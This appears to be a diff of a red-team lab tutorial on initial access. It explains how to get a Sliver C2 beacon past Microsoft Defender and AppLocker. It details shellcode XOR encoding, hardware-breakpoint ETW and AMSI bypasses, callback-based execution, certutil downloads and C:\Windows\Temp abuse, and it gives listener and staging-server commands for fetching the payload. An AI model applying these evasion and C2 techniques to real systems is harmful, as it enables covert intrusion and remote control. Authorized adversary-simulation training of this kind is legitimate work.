@@ -1,19 +1,42 @@
 # 02 - Initial Access: Get Your Beacon Past Defender
 
-## Scenario
+## Context: What You Are Simulating and Why
 
-You have got `CORP\vamsi`, the domain user on the victim machine, to download a file from a page you control. Maybe through a phishing email, maybe through a fake internal IT notification. The delivery method does not matter for this module. What matters is: the file is now on `WORKSTATION01` and vamsi is about to run it.
+### Red Teaming and Adversary Simulation
 
-The machine has:
-- Microsoft Defender running with real-time scanning turned on
-- AppLocker enforcing default executable rules
-- No antivirus exclusions anywhere
+Organizations hire red teams to simulate real-world attacks against their own infrastructure. The goal is to find security gaps before an actual threat actor does. The red team is given written authorization, operates under defined rules of engagement, and produces a report at the end detailing what they accessed and how. This is called **adversary simulation** because you are replicating the exact techniques, tools, and procedures that real attackers use.
 
-Both of these will try to stop your program from running. Defender checks whether your file is malicious. AppLocker checks whether your program is even allowed to run on this machine. You need to get past both of them.
+The entities you are simulating are called **threat actors**. A threat actor is any individual or group that conducts unauthorized attacks against systems or networks. At the most capable end of the spectrum are **APTs** (Advanced Persistent Threats), which are well-funded, organized groups that operate over long timelines with specific objectives like stealing intellectual property, disrupting infrastructure, or establishing long-term access inside a target network. Nation-state-backed groups like Lazarus Group, APT29, or APT41 are examples. You are not going to hack like a script kiddie running `msfvenom`. You are replicating how APTs operate.
 
-This module shows you three methods to do that. Method 1 is the direct approach, good for a lab. Method 2 is the stealth approach, used in real engagements when Method 1 gets caught. Method 3 is the social engineering approach, where the victim thinks they are opening a normal document.
+### The Kill Chain: Where This Module Fits
 
-Read all three methods even if you plan to only run one. Each one teaches you a different concept.
+APT attacks follow a sequence of phases. Security researchers at Lockheed Martin formalized this as the **Cyber Kill Chain**. MITRE ATT&CK breaks it down further into hundreds of specific techniques. The first phase after reconnaissance is **Initial Access**, which is getting your code onto the target machine for the first time. That is this entire module.
+
+Until you have a running process on the target machine, you have zero capability to do anything. You cannot read files, you cannot move laterally to other machines, you cannot dump credentials. Initial access is the prerequisite for everything that follows.
+
+### Implants, Beacons, and C2
+
+The code you place on the target machine is called an **implant**. Implants come in different types. A **beacon** is a specific type of implant that operates on a check-in schedule. It wakes up, connects back to your server, checks if there are any queued commands, runs them, sends the results, and goes quiet again. Between check-ins, there is no active network connection. This makes beacon traffic much harder to detect than a persistent open connection.
+
+The server the beacon connects to is called a **C2 server** (Command and Control). All your commands go through the C2. In this lab, the C2 framework is **Sliver**, an open-source C2 tool developed by BishopFox. Sliver runs on Kali and manages all beacon communications.
+
+The flow is: Sliver runs on Kali, the beacon runs on the victim machine, the beacon checks in to Sliver every 30 seconds, you issue commands through Sliver and the beacon executes them on the victim.
+
+### What You Are Up Against: Defender and AppLocker
+
+Getting a beacon running on a modern Windows corporate machine is not straightforward. Windows has two distinct security mechanisms that work independently of each other.
+
+**Microsoft Defender** is the endpoint protection platform built into Windows. It uses signature-based detection, behavioral analysis, memory scanning, ETW telemetry, and cloud intelligence to detect and kill malicious processes. Bypassing Defender is primarily about evasion at the technical level: your code needs to avoid matching known signatures, avoid triggering behavioral heuristics, and avoid generating detectable telemetry.
+
+**AppLocker** is an application whitelisting policy enforced by Windows. It does not analyze whether something is malicious. It only checks whether a program is in an approved location. If the program is not in an allowed path, it is blocked regardless of what it does. Bypassing AppLocker is about understanding its policy rules and finding paths it trusts or code types it does not control.
+
+You need to defeat both. This module covers three techniques to do that, each using a different approach.
+
+- **Method 1 - Standalone EXE**: A custom Nim-compiled loader dropped into `C:\Windows\Temp\` (an AppLocker-trusted path) and executed directly. Covers Defender evasion at the file and runtime level.
+- **Method 2 - DLL Sideloading**: A malicious DLL placed next to a legitimate Microsoft-signed binary. When that binary loads the DLL as part of normal startup, your implant runs inside a trusted process. AppLocker has no default rules for DLLs.
+- **Method 3 - Masqueraded EXE**: A loader compiled with a PDF icon and a double-extension filename. When executed, it opens a real decoy document and runs the implant silently. Used in phishing-based initial access scenarios.
+
+Study all three methods even if you only run one. Each one demonstrates different defensive controls and how they are circumvented.
 
 ## Objective
 
@@ -21,142 +44,117 @@ Get a live Sliver beacon running as `CORP\vamsi` on `WORKSTATION01` with Defende
 
 ---
 
-## Before You Write Any Code, Understand What You Are Up Against
+## Before You Write Any Code
 
-If you skip this section and jump straight to the commands, you will follow the steps, something will go wrong, and you will have no idea why. This section explains exactly what Defender and AppLocker are doing so that every command you run later makes sense.
+Do not skip this section. Every decision in the loader code corresponds to a specific detection mechanism. If you do not understand what each piece is defeating, you will not know how to fix it when something gets caught.
 
 ---
 
 ## How Defender Works
 
-Defender is the antivirus that comes built into Windows. It does not just scan files once. It watches your program at three separate stages: when the file lands on disk, while the program is running, and through Microsoft's cloud servers. Each stage is a different type of check.
+Defender operates across three detection layers: static analysis when a file lands on disk, behavioral analysis while the process is running, and cloud-based dynamic analysis.
 
-### Stage 1: The File Lands on Disk
+### Static Analysis: When the File Lands on Disk
 
-The moment your file is saved to the victim machine, Defender scans it. This happens before anyone opens it. There are three checks at this stage.
+The moment a file is written to disk, Defender scans it before execution. Three checks happen at this stage.
 
-**Check 1: Is this file already known to be malicious?**
+**Check 1: Hash-based signature matching**
 
-Defender keeps a database of millions of known malicious files. Each file in that database is identified by its hash, which is a unique identifier calculated from the file's bytes. Think of it like a fingerprint. No two different files produce the same hash.
+Every file in Defender's malware database is indexed by its cryptographic hash. A hash is a fixed-length number computed from the file's bytes. Any change to even one byte produces a completely different hash. When your file lands on disk, Defender computes its hash and checks it against the database. If it matches a known malicious file, the file is quarantined immediately.
 
-The moment your file lands on disk, Defender calculates its hash and checks that hash against the database. If it finds a match, Defender deletes the file immediately. The user never gets to run it.
+This is why using publicly known tools like standard Metasploit shellcode or unmodified Cobalt Strike stagers fails instantly. Their hashes are in every Defender database. Writing your own loader in Nim from scratch produces a binary with a hash that does not exist in any database.
 
-This is why you never use public attack tools directly. Standard Metasploit payloads, public Mimikatz builds, known remote access tools, all of them are in every Defender database. They get deleted on contact.
+**Check 2: Static byte pattern signatures**
 
-This is why you write your own loader in Nim from scratch. Every time you compile Nim code, the resulting binary has a different internal structure and a different hash. Defender checks the hash, finds no match, and moves to the next check.
+Even without a matching hash, Defender scans the raw bytes of the file for patterns associated with malicious code. Shellcode (raw machine code that forms the implant) has a characteristic byte structure. It is high-entropy, densely packed, and does not look like normal compiled program code. Defender maintains pattern signatures for common shellcode families.
 
-**Check 2: Does the file contain suspicious patterns?**
+XOR-encoding the shellcode before it ever touches disk defeats this check. XOR transforms the shellcode bytes using a key value, producing output that has no recognizable structure. Defender's pattern scanner finds nothing to match against.
 
-Even if the file has a brand new hash, Defender reads through the file's bytes looking for known bad patterns inside it. This works like a spam filter. A spam filter does not just block emails from known spam senders. It also reads the email text and looks for phrases that appear in spam, like "claim your prize now". Defender does the same thing with file bytes.
+**Check 3: Import table analysis**
 
-Raw shellcode has a recognisable byte pattern. It is dense, high-entropy data with no readable structure. Defender knows what it looks like. If your shellcode is sitting inside your program as raw unmodified bytes, Defender will find it.
+Every PE (Portable Executable) file contains an import table listing the Windows API functions it calls. Defender reads this table before executing the file. A specific sequence of imports is a well-known shellcode loader fingerprint: `VirtualAlloc` to allocate memory, `WriteProcessMemory` or `memcpy` to write into it, `VirtualProtect` to mark it executable, and then execution via a thread or callback.
 
-This is why you XOR-encrypt the shellcode before storing it. XOR encryption scrambles the bytes so they look like random noise. Defender's pattern check sees nothing it recognises.
+The loader resolves all sensitive functions dynamically at runtime using `GetProcAddress` instead of importing them statically. This means the import table contains none of the suspicious functions. Defender's import analysis sees a clean binary.
 
-**Check 3: What Windows functions does the program use?**
+### Behavioral Analysis: While the Process Is Running
 
-Every Windows executable file contains a list of the Windows system functions it calls. This list is called the import table. Notepad's import table contains file reading and writing functions. A media player's import table contains audio and video functions.
+Passing static analysis does not mean the process is safe. Defender continues monitoring through runtime behavioral analysis.
 
-Defender reads this list before running your program. There is a specific combination of functions that almost only appears in shellcode loaders: allocate a block of memory, write data into it, make it executable, then run it. If Defender sees those functions listed together, it flags your file before it even runs.
+**RWX memory detection**
 
-This is why your loader does not list those functions in its import table at all. Instead of listing them upfront, your loader finds them at runtime by looking them up by name after the program has already started. From Defender's point of view, the import table looks normal. The dangerous functions only appear in memory after execution begins.
+Windows memory pages carry permission flags: Read, Write, and Execute. Legitimate programs separate these. Code pages are Read+Execute. Data pages are Read+Write. No normal program needs a memory region that is simultaneously Writable and Executable at the same time, because legitimate code is written at compile time, not injected at runtime.
 
-### Stage 2: The Program Is Running
+A shellcode loader must write the decoded shellcode into memory and then execute it. If the same memory region is writable when the shellcode is written and executable when it runs, Defender flags it as a classic shellcode injection pattern and terminates the process.
 
-Passing the file scan does not mean you are safe. Defender keeps watching your program the whole time it is running. This is the harder problem.
+The loader separates this into two distinct steps. It allocates a page with Write permission only, writes the decoded shellcode into it, then calls `VirtualProtect` to change that page's permission to Execute and remove Write. The page is never simultaneously writable and executable. This is the same memory management pattern used by JIT compilers in browsers and the .NET runtime, which is why Defender treats it as normal behavior.
 
-**Memory that is writable and executable at the same time**
+**ETW telemetry**
 
-When any program needs to store data in RAM, it has to tell Windows what that memory will be used for. There are three permissions: readable, writable, and executable.
+ETW (Event Tracing for Windows) is the kernel-level telemetry infrastructure built into Windows. Every significant operation your process performs generates an ETW event: memory allocations, network connections, thread creation, modifications to executable memory. Defender, EDR products, and Windows Defender for Endpoint all consume this telemetry in real time to build a behavioral picture of your process.
 
-Readable memory is for data you read. Writable memory is for data you write. Executable memory is memory where the CPU can run the bytes as actual code.
+The historical bypass was to patch the `EtwEventWrite` function inside `ntdll.dll` in memory, replacing its first bytes with a return instruction so the function does nothing. This technique is now reliably detected by Defender. It periodically checksums the bytes of loaded system DLLs in memory and compares them against the on-disk originals. Any discrepancy kills the process.
 
-Normal programs do not need memory that is both writable and executable at the same time. You write your code at compile time, not while the program is running. So there is no reason for a normal program to write code into memory and then immediately run it.
+The loader uses hardware breakpoints instead. The x86-64 architecture provides four debug registers (DR0 through DR3) specifically for debuggers. You can set one of these registers to any memory address. When the CPU is about to execute a byte at that address, it raises a debug exception before executing a single instruction of the target function. A Vectored Exception Handler (VEH) registered in the process catches this exception and can modify the CPU context before returning, effectively skipping the function entirely.
 
-Shellcode loaders always need to do exactly that. They write the shellcode bytes into memory and then run them. This pattern, writable-then-executable in the same region, is one of the most reliable signals that a program is loading shellcode. Defender watches for it and kills any process that triggers it.
+The loader sets DR0 to the address of `EtwEventWrite`. Every time Windows tries to write an ETW event from within this process, the CPU raises a debug exception, the handler is called, the handler sets the return value and advances the instruction pointer past the function, and execution continues. No bytes of `ntdll.dll` are modified. No checksum fails. ETW events from this process are silently dropped.
 
-Your loader avoids this by separating the two steps. First, it asks Windows for memory that is writable only, not executable. It writes the shellcode into that memory. Then, in a completely separate Windows API call, it changes that memory to executable and removes the write permission. Writable first, then executable separately. The memory is never both at the same time.
+**AMSI interception**
 
-This two-step approach is the same pattern browsers use when they compile JavaScript to machine code at runtime. Defender sees it and treats it as normal behaviour.
+AMSI (Antimalware Scan Interface) is a Microsoft API that allows security products to scan content that executes in memory. It is integrated into PowerShell, the Windows Script Host, the .NET CLR, and other scripting runtimes. Before any script or command executes, AMSI passes the content to registered security providers (including Defender) for scanning. If the scan returns a detection, execution is blocked.
 
-**Writing code into another running process**
+This is relevant because post-exploitation tools executed through the beacon (enumeration scripts, credential dumpers, lateral movement tools) are often delivered as PowerShell or .NET assemblies that never touch disk. Without AMSI bypass, those tools are caught immediately by in-memory scanning.
 
-One well-known attack technique is to write your shellcode into the memory of another program that is already running, like Windows Explorer or Notepad, and then trigger that program to run it. Your code ends up running inside a legitimate Microsoft process.
+The loader applies the same hardware breakpoint technique to AMSI. DR1 is set to the address of `AmsiScanBuffer` inside `amsi.dll`. When anything in this process triggers an AMSI scan, the debug exception fires, the handler returns `AMSI_RESULT_CLEAN`, and the scan is bypassed without touching any DLL bytes.
 
-Defender recognises this technique and has signatures for it. Your loader does not do this at all. It runs the shellcode inside its own process. That keeps things simpler and avoids those injection signatures.
+**Behavioral sequence timing**
 
-**ETW: Windows keeps a log of everything every process does**
+Defender's behavioral engine tracks sequences of actions and their timing. The pattern of: download data from a remote host, immediately allocate executable memory, immediately write to it, immediately execute it, is a well-documented shellcode loader sequence. At machine speed, this sequence is unambiguous.
 
-Windows has a logging system called ETW, which stands for Event Tracing for Windows. Think of it as a diary that Windows writes automatically. Every time your program asks for memory, Windows logs it. Every time your program makes a network connection, Windows logs it. Every time your program does something with executable memory, Windows logs it. Defender reads this diary in real time.
+Short `sleep()` calls inserted between each phase spread the sequence across time and break the timing correlation. The individual actions still happen, but they no longer form the tight temporal pattern Defender is looking for.
 
-The old technique to stop this logging was simple. Find the ETW logging function inside a Windows system DLL file and overwrite its first few bytes with a return instruction, which makes the function do nothing. This worked for many years.
+### Cloud-Based Dynamic Analysis
 
-Defender in 2026 has a counter for this. It periodically takes a snapshot of the bytes inside Windows system files and compares them to the original. If any bytes have been changed, Defender sees the modification and kills your process.
+When Defender encounters a file it has not seen before, it may submit a sample to Microsoft's cloud sandbox for dynamic analysis. The sandbox executes the file in isolation, records its behavior, and can push new signatures back to Defender globally within minutes.
 
-Your loader uses a different technique called hardware breakpoints. The CPU chip itself has four special registers named DR0, DR1, DR2, and DR3. These were designed for debuggers. You can point one of these registers at a memory address and tell the CPU: whenever execution reaches that address, stop and let me handle it.
-
-Your loader points DR0 at the ETW logging function. When Windows tries to call that function, the CPU stops before the function body even starts, hands control to your exception handler, and your handler tells the CPU to skip the function and return. No bytes of any Windows system file are changed. Defender's snapshot check sees clean, unmodified files. But the ETW logging function never runs.
-
-**AMSI: the scanner for code that runs in memory**
-
-AMSI stands for Antimalware Scan Interface. It was created to solve a specific problem. An attacker who never saves anything to disk, who just runs attack commands directly through PowerShell or runs tools through a beacon, would never trigger Defender's file scanner. Nothing is ever written to disk for Defender to scan.
-
-AMSI plugs this gap. It sits inside PowerShell, the .NET runtime, and other scripting systems. Before PowerShell runs any command, AMSI sends the text of that command to Defender first. If Defender decides it looks malicious, execution stops before any line runs.
-
-This will matter in later modules when you start running enumeration and credential tools through your Sliver session. Without dealing with AMSI, those tools would get caught immediately.
-
-Your loader uses the same hardware breakpoint technique on AMSI that it uses on ETW. It points DR1 at the AMSI scan function. When something tries to trigger a scan, the CPU stops, your handler returns a fake "nothing suspicious found" result, and execution continues. AMSI never actually scans anything.
-
-**Timing: the speed and order of actions**
-
-Defender has behavioural rules that look at chains of actions. A program that connects to a remote server, then immediately downloads data, then immediately allocates executable memory, then immediately runs it, that specific sequence at machine speed, is a well-known shellcode loader pattern. Defender knows it.
-
-Your loader puts short pauses, using `sleep()` calls, between each of those steps. The same sequence still happens, but spread out over time rather than at full machine speed. It no longer matches the timing signature Defender is looking for.
-
-### Stage 3: Cloud Analysis
-
-When Defender sees a file it has never seen before, it can send information about that file up to Microsoft's cloud servers. The cloud servers can run the file in a controlled environment and push new detection rules back to every Defender installation in the world within minutes.
-
-In your lab, the file comes from a private IP address on your local network, not from the internet. Defender is less aggressive about sending files from local sources to the cloud. For this lab, this is not a major concern.
+In this lab environment, the payload is served from a private RFC1918 address. Defender applies less aggressive cloud submission policies to files from local network sources. This is not a meaningful concern for the lab.
 
 ### Summary: Why Each Part of the Loader Exists
 
-Every decision in the loader code maps to one of the detection stages above.
-
-1. **Written in Nim from scratch**: the binary has a unique hash that is not in any database
-2. **Shellcode is XOR-encrypted**: the static byte pattern check finds random-looking noise, not shellcode
-3. **Shellcode is fetched from Kali at runtime**: the dangerous bytes never sit on the victim's disk
-4. **Memory is set writable first, then executable separately**: the write-and-execute detection never triggers
-5. **Hardware breakpoints on ETW and AMSI**: the logging and scanning functions are intercepted without modifying any system file bytes
-6. **Shellcode is run by passing it as a callback to a normal Windows function**: this avoids the pattern of creating a new thread just to run shellcode
-7. **Short sleeps between each step**: the timing signature does not match
+| Loader Design Decision | Defender Mechanism It Defeats |
+|---|---|
+| Custom Nim code compiled fresh | Hash-based signature database |
+| XOR-encoded shellcode | Static byte pattern signatures |
+| Dynamic API resolution at runtime | Import table analysis |
+| Write-then-protect memory, never RWX simultaneously | RWX memory behavioral detection |
+| Hardware breakpoint on EtwEventWrite | ETW telemetry collection |
+| Hardware breakpoint on AmsiScanBuffer | AMSI in-memory content scanning |
+| EnumSystemLocalesA callback execution | CreateThread-based shellcode execution signatures |
+| sleep() calls between each phase | Behavioral sequence timing heuristics |
 
 ---
 
 ## How AppLocker Works
 
-AppLocker is a completely separate system from Defender. Defender tries to detect whether a program is malicious. AppLocker does not check for malicious behaviour at all. It only asks one question: is this program in a location that is allowed to run programs, and is it signed by a trusted publisher?
+AppLocker is an application whitelisting policy enforced at the kernel level by the Software Restriction Policy infrastructure in Windows. It operates entirely independently from Defender. Where Defender analyzes what a program does, AppLocker only evaluates whether a program is authorized to run based on its path, publisher signature, or file hash.
 
-The default AppLocker rules in a corporate Windows environment are:
-- Programs inside `C:\Windows\` are allowed to run
-- Programs inside `C:\Program Files\` are allowed to run
-- Everything else is blocked
+The default AppLocker rules in a corporate environment allow execution from:
+- `C:\Windows\` and all subdirectories
+- `C:\Program Files\` and `C:\Program Files (x86)\`
 
-So if your loader downloads to `C:\Users\vamsi\Downloads\loader.exe`, AppLocker blocks it before it even starts. The user sees a message saying the program is blocked by group policy. Nothing runs.
+Any executable that does not match an allow rule is blocked before a single instruction of it runs. The user sees a policy enforcement dialog. It does not matter whether the program is malicious or completely benign.
 
-You have three ways around this.
+Three approaches bypass this:
 
-**Option A: Place your loader in a path AppLocker trusts.**
-`C:\Windows\Temp\` is inside `C:\Windows\`, so AppLocker allows programs to run from there. A standard user like `vamsi` has write permission to that folder because it is a temporary files directory, not a protected system directory. If your loader lands there, AppLocker allows it to run.
+**Option A: Use a trusted path.**
+`C:\Windows\Temp\` is under `C:\Windows\`, so AppLocker allows execution from it. Standard domain users have Write access to this directory by design. Drop the loader there and execute from there.
 
-**Option B: Use a Microsoft-signed Windows tool to download the file.**
-`certutil.exe` is a Windows tool that ships in `C:\Windows\System32\` and is signed by Microsoft. AppLocker trusts it completely. Certutil has a built-in feature to download files from a URL. You run certutil on the victim machine to download your loader directly into `C:\Windows\Temp\`, then run it from there. AppLocker never blocks certutil and never checks what certutil downloads.
+**Option B: Use a trusted binary to fetch the payload.**
+`certutil.exe` is a Microsoft-signed binary in `C:\Windows\System32\`. AppLocker trusts it unconditionally. It has a built-in URL download capability. Use certutil to fetch the loader directly into `C:\Windows\Temp\`. AppLocker does not inspect what trusted binaries download.
 
-**Option C: Do not run an executable at all. Use DLL sideloading.**
-AppLocker's default configuration has no rules for DLL files. It only controls executables and scripts. A DLL is a code library that gets loaded by another program. If your malicious code is inside a DLL, and a legitimate Microsoft program loads that DLL as part of its normal startup, AppLocker does not check the DLL at all. Your code runs inside a trusted process and AppLocker never sees it. This is Method 2 of this module.
+**Option C: Use a DLL instead of an EXE.**
+AppLocker's default ruleset covers executable files (.exe, .com), scripts (.ps1, .bat, .vbs), and MSI installers. It does not have DLL rules enabled by default. A malicious DLL loaded by a trusted Microsoft-signed binary bypasses AppLocker entirely because DLL loading is not controlled under the default policy. This is the mechanism behind Method 2.
 
 ---
-
 
 
 ## Part 1: Setting Up Sliver on Kali
@@ -165,7 +163,7 @@ Revert your Kali VM to the `baseline-clean` snapshot before starting.
 
 ### 1.1 Start the Sliver Daemon and Console
 
-Sliver runs as a background service on Kali. The install script already configured it as a systemd service. Every time you start a module, start it like this:
+Sliver is the C2 framework running on Kali. It manages all communications with the implant on the target machine. Sliver runs as a background daemon managed by systemd. You connect to it using the Sliver client, which gives you the interactive console where you issue all C2 commands.
 
 ```bash
 # Start the daemon if it is not already running
@@ -195,9 +193,11 @@ sliver >
 
 Leave this terminal open. You will run all Sliver commands from this `sliver >` prompt.
 
-### 1.2 Start the HTTPS C2 Listener
+### 1.2 Start the HTTPS Listener
 
-Your beacon on the victim machine needs somewhere to connect to. You set that up on Kali first. The beacon will send its check-in requests to Kali over HTTPS on port 443. HTTPS is a good choice because port 443 is the standard port for normal web traffic. A connection on port 443 looks less suspicious to anyone monitoring the network than a connection on an unusual port.
+Before deploying the implant, you need the C2 listener running on Kali. The beacon will look for this listener when it first executes on the target. If the listener is not up, the beacon's first check-in fails and you get no session.
+
+HTTPS on port 443 is chosen deliberately for OPSEC reasons. Port 443 carries all normal encrypted web browsing traffic. A connection from a workstation to port 443 on an external IP is indistinguishable from routine browser traffic at the network level. A connection on an unusual port like 4444 or 8080 would stand out immediately in network logs and trigger monitoring alerts.
 
 ```
 sliver > https --lhost 192.168.10.10 --lport 443
@@ -210,7 +210,7 @@ You should see:
 [*] Successfully started job #1
 ```
 
-Sliver is now listening on `192.168.10.10:443`. When your beacon on the victim machine sends check-in requests to that address, Sliver receives them and gives you an interactive session where you can run commands.
+Sliver is now listening on `192.168.10.10:443`. All incoming beacon check-ins from the target machine will be received on this port.
 
 Verify the listener is up:
 
@@ -226,9 +226,9 @@ sliver > jobs
 
 ### 1.3 Generate the Beacon Shellcode
 
-In the old workflow, you had to use a separate tool called msfvenom to generate a small stub that then downloaded the actual Sliver implant from a second listener. That was two separate servers, two separate payloads, and a dependency on Metasploit. It was more complex and had more things that could go wrong.
+Sliver generates the implant as raw shellcode. Shellcode is position-independent machine code with no PE header or wrapper structure around it. Your Nim loader fetches this shellcode at runtime, decodes it in memory, and executes it via a Windows callback.
 
-Sliver can do this in one step. The `generate beacon` command builds the complete Sliver implant and outputs it as raw shellcode. There is no download step, no second listener, nothing extra. Your Nim loader picks up this one file, decodes it in memory, and runs it. The implant then connects back to your HTTPS listener on port 443.
+The shellcode output contains the full Sliver implant compiled into a format your loader can inject directly into memory. There is no staging step, no second server, no secondary download. One shellcode file, one C2 connection.
 
 Run this inside the Sliver console:
 
@@ -253,7 +253,7 @@ What each flag does:
 | `--jitter 10` | Add a random delay of up to 10 seconds to each check-in. So the beacon checks in every 30 to 40 seconds instead of exactly every 30 seconds. This makes the timing less predictable. |
 | `--save /tmp/beacon.bin` | Save the generated shellcode to this file path on Kali. |
 
-Sliver compiles a full Go implant and converts it into shellcode. This process takes between 30 and 90 seconds. You will see a progress message:
+Sliver compiles the implant in Go and converts it to raw shellcode. This takes 30 to 90 seconds.
 
 ```
 [*] Generating new windows/amd64 beacon implant binary
@@ -268,20 +268,21 @@ Check the output file:
 ls -la /tmp/beacon.bin
 ```
 
-The output file will be around 8 to 15 MB in size. This is larger than a small stub payload, because the file contains the complete Sliver implant, not just a download helper. That is why you encode it and serve it from Kali's HTTP server at runtime, rather than embedding it directly inside the Nim loader. The Nim loader stays small. The shellcode sits on Kali and gets fetched when needed.
+The output file will be 8 to 15 MB because it contains the full compiled Sliver implant, not a stub. This is why the shellcode is served from Kali's HTTP server and fetched at runtime rather than embedded in the loader binary. Embedding it would make the loader enormous and easy to identify by size alone.
 
-> **Why use beacon mode instead of session mode?**
-> Session mode keeps a permanent open network connection between the victim and your Kali machine. That permanent connection is visible to anyone watching network traffic. Beacon mode is different. The implant connects, sends its check-in, and then disconnects. Between check-ins, there is no active connection at all. On a network with traffic monitoring, short periodic connections look much more like normal application background traffic than a socket that stays open all day. For real engagements you should always use beacon mode. This lab uses 30-second intervals so you do not have to wait long between commands.
+> **Beacon mode vs session mode:** Session mode maintains a persistent TCP connection between the implant and C2. That open socket is visible in `netstat` output on the target and shows as a continuous connection in network flow logs. Beacon mode is fundamentally different: the implant connects on a schedule, transfers queued data, and disconnects. Between check-ins there is no active connection to detect. From a network monitoring perspective, periodic short-lived HTTPS connections blend into normal application telemetry traffic. Beacon mode is the operationally correct choice for any engagement where network monitoring is present. The 30-second interval in this lab is chosen so you do not wait long for command results.
 
 ---
 
 ## Part 2: XOR-Encode the Shellcode
 
-You cannot put the raw shellcode file directly into your Nim loader and ship it to the victim. Defender's file scanner would read through the bytes, recognise the shellcode pattern, and flag the file before it ever runs.
+The raw shellcode file cannot be shipped to the target as-is. Defender's static analysis reads the raw bytes of every file that lands on disk. Shellcode has a characteristic high-entropy byte structure that Defender's pattern signatures recognise.
 
-The solution is to encrypt the shellcode with a simple algorithm called XOR. XOR encryption works by taking each byte of the shellcode and combining it with a key byte using a bitwise XOR operation. The result looks like random data with no recognisable pattern. When the loader runs on the victim machine, it performs the same XOR operation again to reverse the encryption and get the original shellcode back.
+XOR encoding is the pre-processing step that defeats this. XOR is a bitwise operation: each byte of the shellcode is combined with a key byte using the XOR operator, producing an output byte that has no structural relationship to the original. The entire shellcode becomes statistically random-looking output. Defender's pattern scanner finds no matching signatures.
 
-XOR encryption is simple enough to implement in a few lines of code and fast enough to run in milliseconds. More advanced encryptions like AES would also work, but XOR is sufficient to defeat static pattern scanning, which is what you are trying to avoid at this stage.
+Decryption is the same operation in reverse. XOR is its own inverse: applying XOR with the same key to encoded bytes restores the original. The loader performs this at runtime entirely in memory, so the decoded shellcode never touches disk.
+
+XOR is sufficient for defeating static file scanning. More advanced loaders use AES-256 or ChaCha20 for stronger obfuscation against sandbox analysis and cloud-based dynamic scanning, but XOR clears the static detection layer which is what you need at this stage.
 
 On Kali, create this Python script to encode the shellcode:
 
@@ -345,28 +346,33 @@ Verify the output file exists:
 ls -la /tmp/beacon_encoded.bin
 ```
 
-You now have the XOR-encoded shellcode saved to `/tmp/beacon_encoded.bin`. Defender cannot identify it from a file scan because it looks like random bytes with no pattern.
-
-**Why XOR and not something stronger like AES?** XOR requires no libraries, runs in a few microseconds, and produces output that looks statistically random. AES would also work but you would need to include an AES library and write key management code. The goal at this stage is only to defeat static file scanning. XOR achieves that. More advanced loaders use AES or RC4, but for defeating a pattern-based scanner, XOR is enough.
+The encoded shellcode is now at `/tmp/beacon_encoded.bin`. To Defender's static scanner, this file looks like random bytes. There are no shellcode signatures to match against.
 
 ---
 
 ## Part 3: Method 1 - Standalone Nim EXE Loader
 
-This is the straightforward method. You compile a Windows `.exe` file on Kali, copy it to the victim machine into `C:\Windows\Temp\` (a folder that AppLocker trusts), and run it. The loader does the following things in order: installs hardware breakpoints on ETW and AMSI so Windows does not log what it is doing, fetches the encoded shellcode from Kali over HTTP, decodes it in memory, puts it in a memory region set to read-write, then changes that region to executable and runs it through a standard Windows callback function.
+Method 1 is a standalone PE loader cross-compiled from Kali targeting Windows x64. It is deployed directly into `C:\Windows\Temp\`, a path inside `C:\Windows\` that AppLocker's default rules allow execution from, and standard domain users have write access to by design.
 
-### 3.1 Set Up an HTTP Server on Kali to Serve the Shellcode
+Execution sequence on the target:
+1. Hardware breakpoints are set on `EtwEventWrite` and `AmsiScanBuffer` via CPU debug registers, bypassing ETW telemetry and AMSI scanning without modifying any DLL bytes.
+2. The encoded shellcode is fetched over HTTP from Kali's staging server.
+3. The shellcode is XOR-decoded entirely in memory.
+4. A `PAGE_READWRITE` memory region is allocated, the decoded shellcode is written into it, then `VirtualProtect` changes it to `PAGE_EXECUTE_READ`. The region is never simultaneously writable and executable.
+5. `EnumSystemLocalesA` is called with the shellcode address as its callback. The beacon executes inside this function call without creating a new thread.
 
-The Nim loader on the victim machine will fetch the encoded shellcode file from Kali at runtime. You need an HTTP server on Kali to serve that file. Python has a built-in one that works perfectly for this:
+### 3.1 Set Up an HTTP Staging Server on Kali
+
+The loader fetches the encoded shellcode from Kali over HTTP at runtime. This means the shellcode never sits on the target's disk before execution. The staging server is Python's built-in HTTP server, which requires no configuration and serves all files in the current directory:
 
 ```bash
 cd /tmp
 python3 -m http.server 8888
 ```
 
-This starts a web server that makes all files in `/tmp/` available over HTTP on port 8888. Your loader will request `http://192.168.10.10:8888/beacon_encoded.bin` when it runs on the victim.
+This serves all files in `/tmp/` over HTTP on port 8888. The loader will request `http://192.168.10.10:8888/beacon_encoded.bin` from the target machine at runtime.
 
-Leave this terminal running with the server. Open a new terminal for the next steps.
+Leave this terminal running. Open a new terminal for the following steps.
 
 ### 3.2 Write the Nim Loader
 
@@ -376,7 +382,7 @@ On Kali, create the loader source file:
 nano /tmp/loader.nim
 ```
 
-Paste the code below. Read through the comments inside the code as you paste. Each section has a comment block explaining what that section does and why it is written that way. The comments are important: this is where the actual learning happens.
+Read the inline comments carefully as you paste. Each section is annotated with the specific detection mechanism it addresses and why that approach is used instead of the simpler alternative.
 
 ```nim
 import winim/lean
@@ -600,7 +606,7 @@ when isMainModule:
   runShellcode()
 ```
 
-Save the file (`Ctrl+O`, Enter, `Ctrl+X`).
+Save the file.
 
 ### 3.3 Compile the Loader on Kali
 
@@ -628,37 +634,24 @@ What each flag does:
 | `--cpu:amd64` | Produce a 64-bit binary. The victim machine runs 64-bit Windows. |
 | `-o:/tmp/loader.exe` | Set the output file name and path. |
 
-Compilation takes 10 to 30 seconds. You should see:
+Compilation takes 10 to 30 seconds. You should see output ending with `[SuccessX]`.
 
-```
-CC: loader
-Hint: /tmp/loader.exe [SuccessX]
-```
-
-Check the output:
+Verify the output:
 
 ```bash
 ls -la /tmp/loader.exe
 file /tmp/loader.exe
 ```
 
-The `file` command will confirm the output is a 64-bit Windows executable. The file size should be under 300 KB. Because debug symbols were stripped, there are no readable function names inside the binary for Defender to analyse.
+The `file` command should confirm a 64-bit Windows PE. File size should be under 300 KB. Symbol stripping (`--passL:-s`) removes all function names from the binary, eliminating name-based signature matching.
 
-### 3.4 Deliver the Loader to the Victim
+### 3.4 Deliver the Loader to the Target
 
-The HTTP server on Kali (port 8888) is already serving files from `/tmp/`. Your loader is saved at `/tmp/loader.exe`, so it is reachable at `http://192.168.10.10:8888/loader.exe`.
+The staging server on Kali (port 8888) is already serving `/tmp/`. The loader is reachable at `http://192.168.10.10:8888/loader.exe`.
 
-On the victim machine, log in as `CORP\vamsi` and open a command prompt or PowerShell. You do not need administrator rights for this step.
+On the target machine, log in as `CORP\vamsi`. No administrator rights are needed for this step.
 
